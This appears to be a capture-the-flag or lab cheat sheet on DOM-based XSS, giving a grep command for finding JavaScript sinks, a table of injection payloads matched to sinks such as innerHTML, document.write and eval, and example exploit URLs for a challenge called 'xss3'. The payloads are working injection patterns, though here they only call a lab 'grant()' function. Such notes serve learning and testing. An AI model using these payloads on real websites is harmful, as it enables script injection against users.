# DOM-based XSS

**Signs**: server returns the **same static page** for every parameter value; JS reads
`location.search`, `location.hash`, `URLSearchParams`, `document.referrer`, `postMessage`,
`localStorage` and writes into the page. Payload never appears in the HTTP response (that's the
tell). Hint "the server sends one page, your browser does the rest".

## Find source → sink in the JS
```bash
curl -s $T | grep -nE 'innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(|setTimeout\(|Function\(|location\.(search|hash)|URLSearchParams|\.src\s*=|\.href\s*='
```
| Sink | Payload |
|---|---|
| `innerHTML` / `outerHTML` / `insertAdjacentHTML` | `<img src=x onerror=grant()>` (`<script>` does **not** run via innerHTML) |
| `document.write` | `<script>grant()</script>` works |
| `eval`, `setTimeout(str)`, `Function` | plain JS: `grant()` / `');grant();//` |
| `location = ` / `href =` | `javascript:grant()` |
| jQuery `$(input)` / `.html()` | `<img src=x onerror=grant()>` |

## Exploit
```
$T/?card=<img src=x onerror=grant()>
$T/#<img src=x onerror=grant()>          (hash is never sent to the server)
```
Open in a browser; DevTools → Sources → set a breakpoint on the sink to see your value arrive.

Seen in: `xss3` (team card builder: `?card=` copied into `#card.innerHTML`).
